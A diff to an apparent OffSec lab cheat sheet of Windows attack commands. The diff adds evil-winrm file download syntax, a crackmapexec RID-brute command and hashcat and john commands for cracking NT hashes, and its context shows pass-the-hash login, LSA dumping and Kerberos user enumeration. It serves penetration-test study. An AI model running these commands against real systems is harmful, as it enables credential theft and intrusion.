@@ -30,7 +30,11 @@ evil-winrm -i 192.168.173.165 -u 'svc_apache' -H 4FC1682833B24CF2225248D67DF7E61
 
 $Evil-WinRM PS C:\> Invoke-Binary
 
-$Evil-WinRM PS C:\> Invoke-Binary <kali-Path> run <paramter> 
+$Evil-WinRM PS C:\> Invoke-Binary <kali-Path> run <paramter>
+
+Download file 
+1. download <file>
+2. download <file> <absolute path in my kali>
 ```
 
 This will help to connect **`metasploit`** this is userfull
@@ -61,6 +65,8 @@ crackmapexec smb target.txt -u <usernmae> -p <password>  --lsa
 
 #using hash (. dot means local) 
 crackmapexec smb target.txt -u Administrator -H <hash> -d .
+
+crackmapexec smb 192.168.237.172 -u admin -p '' -d vault.offsec --rid-brute 
 ```
 ## Runascs 
 If creds are found and already logged into the machine then use this command to login as that user. 
@@ -107,3 +113,11 @@ sudo hashcat -m 1000 tom_admin.hash /usr/share/wordlists/rockyou.txt --force
 ┌──(offsec㉿kali)-[~/Downloads]                                                                                                                                                                                                                                                                                                                                                                                  
 └─$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=vault.offsec,userdb=user.txt <ip> -Pn      # got user.txt from seclist                                                                               
 ```
+
+## Hashcat and John 
+```
+sudo hashcat -m 1000 tom_admin.hash /usr/share/wordlists/rockyou.txt --force
+```
+```
+john -wordlist=/usr/share/wordlists/rockyou.txt tom_admin.hash –format=NT
+``` 
